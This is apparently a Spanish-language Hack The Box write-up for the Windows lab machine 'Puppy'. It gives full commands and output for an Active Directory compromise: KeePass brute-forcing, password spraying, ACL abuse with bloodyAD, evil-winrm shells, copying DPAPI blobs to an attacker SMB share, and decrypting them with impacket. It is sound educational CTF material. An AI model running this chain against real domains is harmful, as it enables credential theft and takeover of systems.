# HTB: Puppy

## Host: Windows
## IP: 10.10.11.70

## Procedimiento y comandos

User: **levi.james**
Pass: **KingofAkron2025!**

#### Paso 1: Enumeracion

* Nmap

```bash
nmap -A -Pn -v -p- T4 -oX puppy_tcp.scan --webxml 10.10.11.70
```
Abrimos el archivo en el navegador

* SMB
```bash
smbmap -H 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                                             [|] Checking for open ports...                                                                                             [/] Checking for open ports...                                                                                             [-] Checking for open ports...                                                                                             [\] Checking for open ports...                                                                                             [*] Detected 1 hosts serving SMB
[|] Initializing hosts...                                                                                                  [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[\] Enumerating shares...                                                                                                                                                                                                                                
[+] IP: 10.10.11.70:445 Name: 10.10.11.70               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

* Bloodhound

```bash
bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb -c All -ns 10.10.11.70 --zip
```
En la barra del buscador de la interfaz de bloodhound buscamos el usuario **levi.james**, vemos que este pertenece a 3 Grupos:

                   **DOMAIN USERS** --> member of --> **USERS**
                  / member of
    **LEVI.JAMES**
                  \ member of
                   **HR**
Y vemos en Outbound Object Control, que **HR** tiene **GenericWrite** sobre **Developers** 

    **LEVI.JAMES** -- member of --> **HR** -- GenericWrite --> **DEVELOPERS**

#### Paso 2: ...

1. Nos agregamos al grupo "Developers"

```bash
bloodyAD --host 10.10.11.70 -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'Developers' levi.james
[+] levi.james added to Developers
```

2. corroboramos permisos de lectura por smb nuevamente:

```bash
  smbmap -H 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.70:445 Name: 10.10.11.70               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     READ ONLY       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections  
```

3. Inspeccionamos el share DEV:

```bash
impacket-smbclient puppy.htb/levi.james:'KingofAkron2025!'@10.10.11.70
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
DEV
IPC$
NETLOGON
SYSVOL
# use DEV
# ls
drw-rw-rw-          0  Sun Mar 23 04:07:57 2025 .
drw-rw-rw-          0  Sat Mar  8 13:52:57 2025 ..
-rw-rw-rw-   34394112  Sun Mar 23 04:09:12 2025 KeePassXC-2.7.9-Win64.msi
drw-rw-rw-          0  Sun Mar  9 17:16:16 2025 Projects
-rw-rw-rw-       2677  Tue Mar 11 23:25:46 2025 recovery.kdbx
# get recovery.kdbx
# 
```

4. Ejecutamos un ataque de fuerza bruta.

```bash
  ./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt 
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 45 - Estimated time remaining: 31 weeks, 4 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

5. Inspeccionamos el archivo

```basb
keepassxc recovery.kdbx
```

6. Obtenemos passwords y usuarios, propagamos por smb

```bash
  nxc smb 10.10.11.70 -u users.txt -p pass.txt --continue-on-success
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:KingofAkron2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:KingofAkron2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:KingofAkron2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\administrator:KingofAkron2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:KingofAkron2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:KingofAkron2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:KingofAkron2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:KingofAkron2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\administrator:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:HJKL2025! STATUS_LOGON_FAILURE                                                                                                     
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE                                                                                                   
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\administrator:HJKL2025! STATUS_LOGON_FAILURE                                                                                                    
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE                                                                                                      
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE                                                                                                      
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:HJKL2025! STATUS_LOGON_FAILURE                                                                                                     
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:HJKL2025! STATUS_LOGON_FAILURE                                                                                                     
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:Antman2025! STATUS_LOGON_FAILURE                                                                                               
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:Antman2025! STATUS_LOGON_FAILURE                                                                                                   
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:Antman2025! STATUS_LOGON_FAILURE                                                                                                 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\administrator:Antman2025! STATUS_LOGON_FAILURE                                                                                                  
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE                                                                                                    
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!                                                                                                                         
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:Antman2025! STATUS_LOGON_FAILURE                                                                                                   
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:Antman2025! STATUS_LOGON_FAILURE                                                                                                   
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:Steve2025! STATUS_LOGON_FAILURE                                                                                                
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:Steve2025! STATUS_LOGON_FAILURE                                                                                                    
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:Steve2025! STATUS_LOGON_FAILURE                                                                                                  
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\administrator:Steve2025! STATUS_LOGON_FAILURE                                                                                                   
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Steve2025! STATUS_LOGON_FAILURE                                                                                                     
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:Steve2025! STATUS_LOGON_FAILURE                                                                                                    
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:Steve2025! STATUS_LOGON_FAILURE                                                                                                    
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:ILY2025! STATUS_LOGON_FAILURE                                                                                                  
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:ILY2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:ILY2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\administrator:ILY2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:ILY2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:ILY2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:ILY2025! STATUS_LOGON_FAILURE 
```

* Unico resultado positivo:

```bash
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
```
* SMBMAP

```bash
  smbmap -H 10.10.11.70 -u 'ant.edwards' -p 'Antman2025!'

+] IP: 10.10.11.70:445 Name: 10.10.11.70               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     READ, WRITE     DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```

Encontramos en blood hound:

```bash
ANT.EDWARDS -- member of --> SENIOR DEVS -- GenericAll --> ADAM.SILVER
```

* Con esta informacion podemos usar **ldapsearch** para buscar y confirmar informacion:

```bash
ldapsearch -x -H ldap://10.10.11.70 -D 'Ant.Edwards@PUPPY.HTB' -w 'Antman2025!' -b 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB' userAccountControl -v
ldap_initialize( ldap://10.10.11.70:389/??base )
filter: (objectclass=*)
requesting: userAccountControl 
# extended LDIF
#
# LDAPv3
# base <CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: userAccountControl 
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: 66050

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

userAccountControl: 66050 significa (en hex) 0x10202, que corresponde a: Normal account (512) + DONT_EXPIRE_PASSWORD (65536) + ACCOUNTDISABLE (2)
 → es decir cuenta normal → DESHABILITADA, y la contraseña NO expira

Como siendo el usuario ANT.EDWARDS tenemos GenericAll sobre ADAM.SILVER podriamos habilitar la cuenta y ver a donde nos lleva:

```bash
bloodyAD --host 10.10.11.70 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

Volvemos a corroborar userAcountControl:

```bash
ldapsearch -x -H ldap://10.10.11.70 -D 'Ant.Edwards@PUPPY.HTB' -w 'Antman2025!' -b 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB' userAccountControl -v
ldap_initialize( ldap://10.10.11.70:389/??base )
filter: (objectclass=*)
requesting: userAccountControl 
# extended LDIF
#
# LDAPv3
# base <CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: userAccountControl 
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: 66048

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Ahora el valor es: 66048

la cuenta ya no está deshabilitada (ya no tiene el bit ACCOUNTDISABLE = 2). Ahora es una cuenta normal cuya contraseña no expira.

Vimos que el usuario ADAM.SILVER pertenece al grupo: **REMOTE MANAGMENT USERS** Podemos cambiar el password e intentar usar evil-winrm o rdp para conectarnos:

* Cambio de password:

```bash
bloodyAD --host 10.10.11.70 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password adam.silver Password123!
[+] Password changed successfully!
```
* Conexion con evilwinrm:

```bash
 evil-winrm -i 10.10.11.70 -u adam.silver -p Password123!
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> 

```
** Enumeramos **

```powershell
*Evil-WinRM* PS C:\> dir
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\                                                                                                                                                                                                
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Mode                 LastWriteTime         Length Name                                                                                                                                                            
----                 -------------         ------ ----                                                                                                                                                            
d-----          5/9/2025  10:48 AM                Backups                                                                                                                                                         
d-----         5/12/2025   5:21 PM                inetpub                                                                                                                                                         
d-----          5/8/2021   1:20 AM                PerfLogs                                                                                                                                                        
d-r---         7/24/2025  12:25 PM                Program Files                                                                                                                                                   
d-----          5/8/2021   2:40 AM                Program Files (x86)                                                                                                                                             
d-----          3/8/2025   9:00 AM                StorageReports                                                                                                                                                  
d-r---         9/12/2025   7:44 PM                Users                                                                                                                                                           
d-----         5/13/2025   4:40 PM                Windows
```
Lo mas interesante parece ser la carpeta backups:

```powershel
*Evil-WinRM* PS C:\Backups> dir


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip
                                        
Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip
                                        
Info: Download successful!                                                                                                                                                                                        
*Evil-WinRM* PS C:\Backups> 
```

* En kali revisamos el archivo:

```bash
drwxrwxr-x 6 root root 4096 Dec 31  1979 assets
drwxrwxr-x 2 root root 4096 Dec 31  1979 images
-rw-rw-r-- 1 root root 7258 Dec 31  1979 index.html
-rw-r--r-- 1 root root  864 Dec 31  1979 nms-auth-config.xml.bak
                                                                                                                                                                                                                  
   root@kali  100    puppy    
  cat nms-auth-config.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

Encontramos un distinguish name y un password, aparentemente de STEPH.COOPER.

* Propagamos:

```bash
nxc smb 10.10.11.70 -u users.txt -p pass.txt --continue-on-success
...
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025! 
...
```
Confirmamos que las credenciales son validas analizamos en bloodhound al usuario **STEPH.COOPER** y vemos que pertenece algrupo REMOTE MANAGMENT USERS

* Nos logeamos con evilwinrm:

```bash
evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> 
```

Despues de mucho buscar encontramos:

```powershell
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> dir -h C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

Ese archivo en C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69E... es muy probablemente un blob protegido por **DPAPI**
la API de protección de datos de Windows. En términos generales, el archivo contiene datos cifrados 
(por ejemplo: credenciales guardadas, tokens o claves) que no son inmediatamente legibles
**Si logramos descifrarlo, puede revelar: contraseñas guardadas, tokens, o datos que la app guardó**

Pero descifrar ese blob requiere más información: normalmente la clave DPAPI asociada al perfil de usuario (o al equipo), 
que depende de credenciales del usuario/SYSTEM. Sin esa clave, el blob es de poca utilidad práctica

* Que necesitamos?
1. **Acceso necesario:** 
tipicamente acceso al perfil de usuario o privilegios elevados (SYSTEM). 
Sin acceso al perfil de usuario y a las claves DPAPI del sistema/usuario, no puedes descifrar el blob.

2. **Material criptográfico requerido: **
la clave maestra DPAPI asociada al SID del usuario (que Windows guarda cifrada, enlazada a la contraseña del usuario y/o a claves del equipo). 
A menudo también se requiere el hash NTLM o la contraseña del usuario si se va a hacer una recuperación offline


#### Decrypting the blob DPAPI

[Medium post](https://infosecwriteups.com/decrypting-dpapi-credentials-offline-8c8f27207956)

**Requerimientos: **

1. SID: `S-1-5-21-1487982659-1829050783-2281216199-1107`
```powershell
([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
```

2. GUID: (PowerView): `ba8f48bd-c306-4a85-8f99-bf3f9df4c532`
```bash
Get-DomainUser -Identity steph.cooper -Properties objectguid | Select-Object samaccountname, objectguid
```

Navegamos hasta el directorio y corroboramos la existencia del masterkey:

```powershell
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect> dir


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107

*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> dir -h


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred


*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> 
```

* Descargamos el bolb y el masterkey con ayuda de impacket-smbserver

```bash
impacket-smbserver share ./ -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
* Copiamos bolb y masterkey en el share

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 \\10.10.14.218\share

*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 \\10.10.14.218\share

```

* Vemos en el servidor el movimiento:

```bash
[*] Incoming connection (10.10.11.70,59401)
[*] AUTHENTICATE_MESSAGE (\,DC)                                                                                                                                                                                   
[*] User DC\ authenticated successfully                                                                                                                                                                           
[*] :::00::aaaaaaaaaaaaaaaa                                                                                                                                                                                       
[*] Connecting Share(1:IPC$)                                                                                                                                                                                      
[*] Connecting Share(2:share)                                                                                                                                                                                     
[*] Disconnecting Share(1:IPC$)                                                                                                                                                                                   
[*] Disconnecting Share(2:share)                                                                                                                                                                                  
[*] Closing down connection (10.10.11.70,59401)                                                                                                                                                                   
[*] Remaining connections []                                                                                                                                                                                      
[*] Incoming connection (10.10.11.70,59436)                                                                                                                                                                       
[*] AUTHENTICATE_MESSAGE (\,DC)                                                                                                                                                                                   
[*] User DC\ authenticated successfully                                                                                                                                                                           
[*] :::00::aaaaaaaaaaaaaaaa                                                                                                                                                                                       
[*] Connecting Share(1:share)                                                                                                                                                                                     
[*] Disconnecting Share(1:share)
[*] Closing down connection (10.10.11.70,59436)
[*] Remaining connections []
```

* Decodificamos:

```bash
impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```bash
impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

Agregamos la contrasena a nuestro archivo de passwords y propagamos por winrm:

```bash
WINRM       10.10.11.70     5985   DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
```

* Nos conectamos:

```bash
*Evil-WinRM* PS C:\Users\steph.cooper_adm> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\adam.silver\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/12/2025  10:02 AM             34 user.txt


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/12/2025  10:02 AM             34 root.txt


*Evil-WinRM* PS C:\Users\steph.cooper_adm> 
```
